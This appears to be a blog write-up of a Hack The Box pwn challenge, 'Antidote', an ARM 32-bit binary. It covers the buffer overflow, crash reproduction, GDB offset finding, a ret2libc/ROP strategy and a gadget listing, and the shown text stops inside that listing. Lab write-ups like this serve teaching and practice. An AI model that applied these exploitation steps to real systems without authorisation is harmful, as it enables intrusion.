<!doctype html><html lang="en"><head><title>Antidote | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="ARM 32-bit binary. Buffer Overflow. Ret2csu. Ret2Libc"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="ARM 32-bit binary. Buffer Overflow. Ret2csu. Ret2Libc"><meta itemprop="keywords" content><meta itemprop="name" content="Antidote"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="ARM 32-bit binary. Buffer Overflow. Ret2csu. Ret2Libc"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Antidote"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/antidote/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="ARM 32-bit binary. Buffer Overflow. Ret2csu. Ret2Libc"><meta name="twitter:description" content="ARM 32-bit binary. Buffer Overflow. Ret2csu. Ret2Libc"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Antidote"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/htb-challenges/pwn/antidote/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/antidote/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/antidote/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/antidote/&amp;text=Antidote" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/antidote/&amp;title=Antidote" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Antidote</h1><p class="mb4 f6 dib tracked">14 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#buffer-overflow-vulnerability">Buffer Overflow vulnerability</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are given an ARM 32-bit binary called <code>antidote</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     arm-32-little
RELRO:    <span class="code-dark-red">No RELRO</span>
Stack:    <span class="code-dark-red">No canary found</span>  
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-red">No PIE (0x8000)</span>
</code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>We can use Ghidra to analyze the binary and look at the decompiled source code in C. This is <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  undefined data[</span><span class="mtk6">64</span><span class="mtk1">];</span>
<span class="mtk1">  undefined message[</span><span class="mtk6">152</span><span class="mtk1">];</span>

<span class="mtk1">  </span><span class="mtk8">setvbuf</span><span class="mtk1">(stdout, (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">memcpy</span><span class="mtk1">(message, </span><span class="mtk4">"Bzzzzzzz... Bzzzzzzzzzzzzzzz... Damn those bugs!</span><span class="mtk6">\n</span><span class="mtk4">Come on, hurry up analyzing that bug</span><span class="mtk6">\'</span><span class="mtk4">s  DNA! I can</span><span class="mtk6">\'</span><span class="mtk4">t wait to get out of here!</span><span class="mtk6">\n</span><span class="mtk4">Careful there! That hurt!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1"> , </span><span class="mtk6">152</span><span class="mtk1">);</span>  
<span class="mtk1">  </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, message, </span><span class="mtk6">152</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, data, </span><span class="mtk6">300</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="buffer-overflow-vulnerability">Buffer Overflow vulnerability</h3><p>The binary is vulnerable to Buffer Overflow since there is a variable called <code>data</code> that has 64 bytes assigned as buffer, but the program is reading up to 300 bytes from <code>stdin</code> and storing the data into <code>data</code>, overflowing the reserved buffer if the size of the input data is greater than 64 bytes.</p><p>We can check that it crashes in this situation (in order to run and debug ARM binaries, check out <a target="_blank" href="https://ropemporium.com/guide.html">ROP Emporium guide</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./antidote</span>
Bzzzzzzz... Bzzzzzzzzzzzzzzz... Damn those bugs!
Come on, hurry up analyzing that bug's DNA! I can't wait to get out of here!  
Careful there! That hurt!
asdf

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'print("A" * 300)'</span> | <span class="code-dark-green">./antidote</span>
Bzzzzzzz... Bzzzzzzzzzzzzzzz... Damn those bugs!
Come on, hurry up analyzing that bug's DNA! I can't wait to get out of here!
Careful there! That hurt!
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
zsh: done                              python3 -c 'print("A" * 300)' |
zsh: segmentation fault (core dumped)  ./antidote
</code></pre></div><p>The program has crashed because we have overwritten the return address saved on the stack. Let&rsquo;s use GDB to find the offset we need to reach this address value:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">qemu-arm</span> -g 1234 <span class="mtku">antidote</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb-multiarch</span> -q
<span class="code-red">gef➤  </span>file antidote
Reading symbols from <span class="code-dark-green">antidote</span>...
(No debugging symbols found in <span class="code-dark-green">antidote</span>)
<span class="code-red">gef➤  </span>target remote localhost:1234
Remote debugging using localhost:1234
warning: remote target does not support file transfer, attempting to access files from local filesystem.  
warning: Unable to find dynamic linker breakpoint function.
GDB will be unable to debug shared library initializers
and track explicitly loaded dynamic code.
<span class="code-dark-blue">0xff7bca40</span> in <span class="code-dark-yellow">??</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>pattern create 300
<span class="code-blue">[+]</span> Generating a pattern of 300 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboa  
abpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
<span class="code-green">[+]</span> Saved as '$_gef0'
<span class="code-green">gef➤  </span>continue
Continuing.
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">qemu-arm</span> -g 1234 <span class="mtku">antidote</span>
Bzzzzzzz... Bzzzzzzzzzzzzzzz... Damn those bugs!
Come on, hurry up analyzing that bug's DNA! I can't wait to get out of here!
Careful there! That hurt!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Program received signal SIGSEGV, Segmentation fault.  
<span class="code-dark-blue">0x63616166</span> in <span class="code-dark-yellow">??</span> ()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>pattern offset $pc
<span class="code-blue">[+]</span> Searching for '$pc'
<span class="code-green">[+]</span> Found at offset 220 (little-endian search) <span class="code-red">likely</span>  
<span class="code-green">[+]</span> Found at offset 508 (big-endian search)
</code></pre></div><p>So we need exactly 220 bytes to control <code>$pc</code>.</p><h2 id="exploit-strategy">Exploit strategy</h2><p>Since the binary has NX protection, we must use Return Oriented Programming (ROP) to execute arbitrary code. This technique makes use of gadgets, which are sets of instructions that end in <code>ret</code> (usually). We can add a list of addresses for gadgets on the stack so that when a gadget is executed, it returns to the stack and executes the next gadget. That is the meaning of ROP chain.</p><p>This is a bypass for NX protection since we are not executing instructions in the stack (shellcode), but we are redirecting the program to specific addresses that are executable and run the instructions we want.</p><p>In order to gain code execution, we will perform a Ret2Libc attack. This technique consists of calling <code>system</code> inside Glibc using <code>"/bin/sh"</code> as first parameter to the function (which is also inside Glibc). The problem we must handle is ASLR, which is a protection set for shared libraries that randomize a base address.</p><p>Since we want to call <code>system</code> and take <code>"/bin/sh"</code>, we need to know the addresses of those values inside Glibc at runtime (these addresses will change in every execution). Hence, we must find a way to leak an address inside Glibc because the only thing that is random is the base address of Glibc; the rest of the addresses are computed as offsets to that base address.</p><p>The process of leaking a function comes with calling <code>write</code> using an address from the Global Offset Table (GOT) as first argument (for example, <code>write</code> as well). This table contains the real addresses of the external functions used by the program (if they have been resolved).</p><h2 id="exploit-development">Exploit development</h2><p>Let&rsquo;s see what ROP gadgets we have:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>ropper
<span class="code-dark-green">[INFO]</span> Load gadgets for section: PHDR
<span class="code-dark-green">[LOAD]</span> loading... <span class="code-white">100%</span>
<span class="code-dark-green">[INFO]</span> Load gadgets for section: LOAD
<span class="code-dark-green">[LOAD]</span> loading... <span class="code-white">100%</span>
<span class="code-dark-green">[LOAD]</span> removing double gadgets... <span class="code-white">100%</span>



Gadgets
=======


<span class="code-dark-red">0x00000620</span>: <span class="code-yellow">add</span> <span class="code-white">r4, r5, #4<span class="code-blue">; <span class="code-yellow">bne</span> <span class="code-white">#0x5ec<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r4, r5, r6, r7, r8, sb, sl, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x00000620</span>: <span class="code-yellow">add</span> <span class="code-white">r4, r5, #4<span class="code-blue">; <span class="code-yellow">bne</span> <span class="code-white">#0x5ec<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r4, r5, r6, r7, r8, sb, sl, pc}<span class="code-blue">; <span class="code-yellow">andeq</span> <span class="code-white">r8, r0, r4, lsr #3<span class="code-blue">; <span class="code-yellow">andeq</span> <span class="code-white">r8, r0, r4, lsr #3<span class="code-blue">; <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">;</span>  
<span class="code-dark-red">0x00000604</span>: <span class="code-yellow">add</span> <span class="code-white">r6, r6, #2<span class="code-blue">; <span class="code-yellow">ldr</span> <span class="code-white">ip, [r4, #4]<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r0, sl<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r1, r8<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r2, r7<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">ip<span class="code-blue">;</span>
<span class="code-dark-red">0x000003c0</span>: <span class="code-yellow">andeq</span> <span class="code-white">r0, r0, r6, lsl fp<span class="code-blue">; <span class="code-yellow">push</span> <span class="code-white">{r3, lr}<span class="code-blue">; <span class="code-yellow">bl</span> <span class="code-white">#0x474<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x000003b8</span>: <span class="code-yellow">andeq</span> <span class="code-white">r0, r0, r6, lsl r8<span class="code-blue">; <span class="code-yellow">andeq</span> <span class="code-white">r0, r1, r4, asr r8<span class="code-blue">; <span class="code-yellow">andeq</span> <span class="code-white">r0, r0, r6, lsl fp<span class="code-blue">; <span class="code-yellow">push</span> <span class="code-white">{r3, lr}<span class="code-blue">; <span class="code-yellow">bl</span> <span class="code-white">#0x474<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x000003bc</span>: <span class="code-yellow">andeq</span> <span class="code-white">r0, r1, r4, asr r8<span class="code-blue">; <span class="code-yellow">andeq</span> <span class="code-white">r0, r0, r6, lsl fp<span class="code-blue">; <span class="code-yellow">push</span> <span class="code-white">{r3, lr}<span class="code-blue">; <span class="code-yellow">bl</span> <span class="code-white">#0x474<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x0000062c</span>: <span class="code-yellow">andeq</span> <span class="code-white">r8, r0, r4, lsr #3<span class="code-blue">; <span class="code-yellow">andeq</span> <span class="code-white">r8, r0, r4, lsr #3<span class="code-blue">; <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">;</span>
<span class="code-dark-red">0x0000062c</span>: <span class="code-yellow">andeq</span> <span class="code-white">r8, r0, r4, lsr #3<span class="code-blue">; <span class="code-yellow">andeq</span> <span class="code-white">r8, r0, r4, lsr #3<span class="code-blue">; <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">; <span class="code-yellow">push</span> <span class="code-white">{r3, lr}<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x00000630</span>: <span class="code-yellow">andeq</span> <span class="code-white">r8, r0, r4, lsr #3<span class="code-blue">; <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">;</span>
<span class="code-dark-red">0x00000630</span>: <span class="code-yellow">andeq</span> <span class="code-white">r8, r0, r4, lsr #3<span class="code-blue">; <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">; <span class="code-yellow">push</span> <span class="code-white">{r3, lr}<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x00000550</span>: <span class="code-yellow">bl</span> <span class="code-white">#0x3e4<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r3, #0<span class="code-blue">; <span class="code-yellow">mov</span> <span class="code-white">r0, r3<span class="code-blue">; <span class="code-yellow">sub</span> <span class="code-white">sp, fp, #4<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{fp, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x000003c8</span>: <span class="code-yellow">bl</span> <span class="code-white">#0x474<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x000005e0</span>: <span class="code-yellow">blx</span> <span class="code-white">ip<span class="code-blue">;</span>
<span class="code-dark-red">0x00000618</span>: <span class="code-yellow">blx</span> <span class="code-white">ip<span class="code-blue">; <span class="code-yellow">cmp</span> <span class="code-white">r6, sb<span class="code-blue">; <span class="code-yellow">add</span> <span class="code-white">r4, r5, #4<span class="code-blue">; <span class="code-yellow">bne</span> <span class="code-white">#0x5ec<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r4, r5, r6, r7, r8, sb, sl, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x000004d4</span>: <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x000004d4</span>: <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x00000624</span>: <span class="code-yellow">bne</span> <span class="code-white">#0x5ec<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r4, r5, r6, r7, r8, sb, sl, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x00000624</span>: <span class="code-yellow">bne</span> <span class="code-white">#0x5ec<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r4, r5, r6, r7, r8, sb, sl, pc}<span class="code-blue">; <span class="code-yellow">andeq</span> <span class="code-white">r8, r0, r4, lsr #3<span class="code-blue">; <span class="code-yellow">andeq</span> <span class="code-white">r8, r0, r4, lsr #3<span class="code-blue">; <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">;</span>
<span class="code-dark-red">0x000004ac</span>: <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">;</span>
<span class="code-dark-red">0x00000634</span>: <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">; <span class="code-yellow">push</span> <span class="code-white">{r3, lr}<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
<span class="code-dark-red">0x000004a0</span>: <span class="code-yellow">cmp</span> <span class="code-white">r2, #0<span class="code-blue">; <span class="code-yellow">moveq</span> <span class="code-white">r2, #1<span class="code-blue">; <span class="code-yellow">strbeq</span> <span class="code-white">r2, [r3]<span class="code-blue">; <span class="code-yellow">bx</span> <span class="code-white">lr<span class="code-blue">;</span>
<span class="code-dark-red">0x000004cc</span>: <span class="code-yellow">cmp</span> <span class="code-white">r3, #0<span class="code-blue">; <span class="code-yellow">popeq</span> <span class="code-white">{r3, pc}<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">;</span>
<span class="code-dark-red">0x000004cc</span>: <span class="code-yellow">cmp</span> <span class="code-white">r3, #0<span class="code-blue">; <span class="code-yellow">popeq</span> <span class="code-white">{r3, pc}<span class="code-blue">; <span class="code-yellow">blx</span> <span class="code-white">r3<span class="code-blue">; <span class="code-yellow">pop</span> <span class="code-white">{r3, pc}<span class="code-blue">;</span>
